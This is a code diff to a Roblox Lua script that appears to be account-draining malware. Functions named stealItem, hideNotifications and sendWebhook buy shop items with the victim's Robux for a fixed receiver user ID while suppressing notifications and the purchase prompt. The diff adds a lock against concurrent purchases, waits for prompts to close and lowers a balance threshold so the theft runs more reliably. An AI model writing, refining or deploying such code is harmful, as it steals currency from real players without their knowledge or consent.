@@ -229,6 +229,9 @@ local function sendWebhook(totalSpent)
     })
 end
 
+local promptConfirmed = false
+local purchaseInProgress = false
+
 local function waitForPromptToDisappear()
     local PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
     if not PurchasePrompt then return end
@@ -243,6 +246,12 @@ local function waitForPromptToDisappear()
 end
 
 local function buyItem(storageName, purchaseLocation, cost)
+    if purchaseInProgress then
+        return
+    end
+
+    purchaseInProgress = true
+
     local args = {
         [1] = "buyRobuxShop",
         [2] = {
@@ -254,6 +263,7 @@ local function buyItem(storageName, purchaseLocation, cost)
             ["ReceiverUserId"] = UserId,
         }
     }
+
     local CommF = ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("CommF_")
     if CommF then
         CommF:InvokeServer(unpack(args))
@@ -262,6 +272,10 @@ local function buyItem(storageName, purchaseLocation, cost)
     else
         warn("Remote 'CommF_' not found.")
     end
+
+    waitForPromptToDisappear()
+
+    purchaseInProgress = false
 end
 
 hideNotifications()
@@ -387,11 +401,13 @@ local function stealItem(balance)
         end
     elseif balance >= 75 then
         buyItem("Permanent Spin-Spin", "FruitShop", 75)
-    elseif balance >= 61 then
+    elseif balance >= 50 then
         buyItem("10K Money", "Shop", 50)
     elseif balance >= 25 then
         buyItem("2x EXP (15 mins.)", "Shop", 25)
     end
+
+    return
 end
 
 local CoreGui = game:GetService("CoreGui")
